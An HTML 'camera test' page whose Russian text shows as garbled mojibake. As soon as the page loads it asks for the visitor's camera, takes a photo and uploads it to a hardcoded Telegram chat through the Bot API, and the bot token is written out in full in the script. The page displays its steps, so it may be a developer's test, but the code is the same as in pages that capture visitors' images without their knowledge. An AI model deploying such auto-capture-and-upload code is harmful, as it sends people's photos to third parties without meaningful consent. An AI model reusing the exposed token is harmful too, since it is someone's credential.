<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Camera Test</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            padding: 20px; 
            background: #000; 
            color: #0f0;
            text-align: center;
        }
        .status { 
            margin: 10px 0; 
            padding: 10px; 
            border-radius: 5px; 
        }
        .waiting { background: #333; }
        .success { background: #0d3a0d; }
        .error { background: #3a0d0d; color: #f00; }
        #preview { 
            max-width: 90%; 
            margin: 20px auto; 
            border: 2px solid #0f0;
            border-radius: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <h2>üì± –¢–µ—Å—Ç –∫–∞–º–µ—Ä—ã –∏ Telegram</h2>
    <div id="log"></div>
    <img id="preview" alt="–ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä">
    
<script>
// === –ù–ê–°–¢–†–û–ô–ö–ò (–ó–ê–ú–ï–ù–ò–¢–ï –°–í–û–ò–ú–ò) ===
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
// ====================================

const log = document.getElementById('log');
const preview = document.getElementById('preview');

function addLog(message, type = 'waiting') {
    const div = document.createElement('div');
    div.className = `status ${type}`;
    div.textContent = `[${new Date().toLocaleTimeString().slice(0,8)}] ${message}`;
    log.appendChild(div);
    console.log(message); // –¢–∞–∫–∂–µ –≤ –∫–æ–Ω—Å–æ–ª—å –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
}

async function runTest() {
    let stream = null;
    
    try {
        addLog('1. –ü—Ä–æ–≤–µ—Ä—è—é –ø–æ–¥–¥–µ—Ä–∂–∫—É –∫–∞–º–µ—Ä—ã...');
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞, –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –ª–∏ –±—Ä–∞—É–∑–µ—Ä –∫–∞–º–µ—Ä—É
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            throw new Error('–í–∞—à –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –∫–∞–º–µ—Ä—É');
        }
        
        addLog('2. –ó–∞–ø—Ä–∞—à–∏–≤–∞—é –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ...');
        
        // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –ª—é–±—É—é –¥–æ—Å—Ç—É–ø–Ω—É—é –∫–∞–º–µ—Ä—É
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user', // –°–Ω–∞—á–∞–ª–∞ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è
                width: { ideal: 640 },
                height: { ideal: 480 }
            }
        }).catch(async (err) => {
            addLog('–§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞, –ø—Ä–æ–±—É—é –∑–∞–¥–Ω—é—é...', 'waiting');
            // –ï—Å–ª–∏ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø—Ä–æ–±—É–µ–º –∑–∞–¥–Ω—é—é
            return await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' }
            });
        });
        
        addLog('‚úÖ –ö–∞–º–µ—Ä–∞ –ø–æ–ª—É—á–µ–Ω–∞!', 'success');
        
        addLog('3. –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞—é –≤–∏–¥–µ–æ...', 'waiting');
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        
        // –ñ–¥—ë–º –ø–æ–ª–Ω–æ–π –∑–∞–≥—Ä—É–∑–∫–∏ –≤–∏–¥–µ–æ
        await new Promise((resolve, reject) => {
            video.onloadedmetadata = resolve;
            video.onerror = reject;
            setTimeout(() => reject(new Error('–¢–∞–π–º–∞—É—Ç –∑–∞–≥—Ä—É–∑–∫–∏ –∫–∞–º–µ—Ä—ã')), 10000);
        });
        
        addLog(`–†–∞–∑–º–µ—Ä –≤–∏–¥–µ–æ: ${video.videoWidth}x${video.videoHeight}`, 'success');
        
        // –î–∞—ë–º –∫–∞–º–µ—Ä–µ –≤—Ä–µ–º—è –Ω–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫—É (—É–≤–µ–ª–∏—á–µ–Ω–æ –¥–æ 3 —Å–µ–∫—É–Ω–¥)
        addLog('4. –ù–∞—Å—Ç—Ä–∞–∏–≤–∞—é –∫–∞–º–µ—Ä—É (3 —Å–µ–∫—É–Ω–¥—ã)...', 'waiting');
        for (let i = 3; i > 0; i--) {
            addLog(`–û—Å—Ç–∞–ª–æ—Å—å ${i}...`, 'waiting');
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        
        addLog('5. –î–µ–ª–∞—é —Å–Ω–∏–º–æ–∫...', 'waiting');
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        // –î–µ–ª–∞–µ–º –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø–æ–ø—ã—Ç–æ–∫ —Å–Ω–∏–º–∫–∞
        let photoSuccess = false;
        for (let attempt = 1; attempt <= 3; attempt++) {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.drawImage(video, 0, 0);
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ —á—ë—Ä–Ω–æ–µ –ª–∏ —Ñ–æ—Ç–æ
            const imageData = ctx.getImageData(0, 0, 10, 10); // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–±–æ–ª—å—à–æ–π —É—á–∞—Å—Ç–æ–∫
            const data = imageData.data;
            let sum = 0;
            for (let i = 0; i < data.length; i += 4) {
                sum += data[i] + data[i + 1] + data[i + 2];
            }
            
            if (sum > 1000) { // –ï—Å–ª–∏ –Ω–µ —Å–æ–≤—Å–µ–º —á—ë—Ä–Ω–æ–µ
                photoSuccess = true;
                addLog(`‚úÖ –ü–æ–ø—ã—Ç–∫–∞ ${attempt}: —Ñ–æ—Ç–æ –Ω–µ —á—ë—Ä–Ω–æ–µ`, 'success');
                break;
            }
            
            addLog(`‚ö†Ô∏è –ü–æ–ø—ã—Ç–∫–∞ ${attempt}: —Ñ–æ—Ç–æ —Å–ª–∏—à–∫–æ–º —Ç—ë–º–Ω–æ–µ, –∂–¥—É –µ—â—ë...`, 'waiting');
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        if (!photoSuccess) {
            addLog('‚ö†Ô∏è –í–Ω–∏–º–∞–Ω–∏–µ: —Ñ–æ—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å —Ç—ë–º–Ω—ã–º', 'waiting');
        }
        
        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
        stream.getTracks().forEach(track => track.stop());
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø—Ä–µ–≤—å—é –Ω–∞ —ç–∫—Ä–∞–Ω–µ
        preview.src = canvas.toDataURL('image/jpeg', 0.8);
        preview.style.display = 'block';
        
        addLog('6. –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞—é –æ—Ç–ø—Ä–∞–≤–∫—É –≤ Telegram...', 'waiting');
        
        // –°–æ–∑–¥–∞—ë–º Blob –∏–∑ —Ñ–æ—Ç–æ
        const blob = await new Promise(resolve => {
            canvas.toBlob(resolve, 'image/jpeg', 0.8);
        });
        
        if (!blob) {
            throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ');
        }
        
        addLog(`–†–∞–∑–º–µ—Ä —Ñ–æ—Ç–æ: ${Math.round(blob.size/1024)} –ö–ë`, 'success');
        
        addLog('7. –û—Ç–ø—Ä–∞–≤–ª—è—é –≤ Telegram...', 'waiting');
        
        // –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'camera_test.jpg');
        formData.append('caption', `–¢–µ—Å—Ç –∫–∞–º–µ—Ä—ã\n–†–∞–∑–º–µ—Ä: ${canvas.width}x${canvas.height}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`);
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å —Ç–∞–π–º–∞—É—Ç–æ–º
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 30000);
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData,
            signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        const result = await response.json();
        
        if (result.ok) {
            addLog('‚úÖ –§–æ—Ç–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram!', 'success');
            addLog('ID —Å–æ–æ–±—â–µ–Ω–∏—è: ' + result.result.message_id, 'success');
            
            // –û—á–∏—â–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
            setTimeout(() => {
                document.body.innerHTML = '<div style="color:#0f0;padding:50px;text-align:center">‚úÖ –ì–æ—Ç–æ–≤–æ! –ú–æ–∂–Ω–æ –∑–∞–∫—Ä—ã—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É.</div>';
            }, 5000);
            
        } else {
            throw new Error(`Telegram API: ${result.description || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}`);
        }
        
    } catch (error) {
        addLog(`‚ùå –û–®–ò–ë–ö–ê: ${error.message}`, 'error');
        
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ–¥—Å–∫–∞–∑–∫–∏ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –æ—à–∏–±–∫–∏
        if (error.name === 'NotAllowedError' || error.message.includes('permission')) {
            addLog('üîí –†–µ—à–µ–Ω–∏–µ: –†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö –±—Ä–∞—É–∑–µ—Ä–∞', 'waiting');
        } else if (error.name === 'NotFoundError' || error.message.includes('camera')) {
            addLog('üì∑ –†–µ—à–µ–Ω–∏–µ: –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –∫–∞–º–µ—Ä–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞ –∏ —Ä–∞–±–æ—Ç–∞–µ—Ç', 'waiting');
        } else if (error.name === 'AbortError' || error.message.includes('timeout')) {
            addLog('‚è±Ô∏è –†–µ—à–µ–Ω–∏–µ: –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ', 'waiting');
        } else if (error.message.includes('Telegram')) {
            addLog('ü§ñ –†–µ—à–µ–Ω–∏–µ: –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Ç–æ–∫–µ–Ω –±–æ—Ç–∞ –∏ –Ω–∞–ø–∏—à–∏—Ç–µ –µ–º—É /start', 'waiting');
        }
        
        // –û—á–∏—â–∞–µ–º —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥
        setTimeout(() => {
            document.body.innerHTML = '<div style="color:#f00;padding:50px;text-align:center">‚ùå –û—à–∏–±–∫–∞. –û–±–Ω–æ–≤–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–∏.</div>';
        }, 10000);
    }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–µ—Å—Ç –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
window.addEventListener('DOMContentLoaded', runTest);
</script>
</body>
</html>
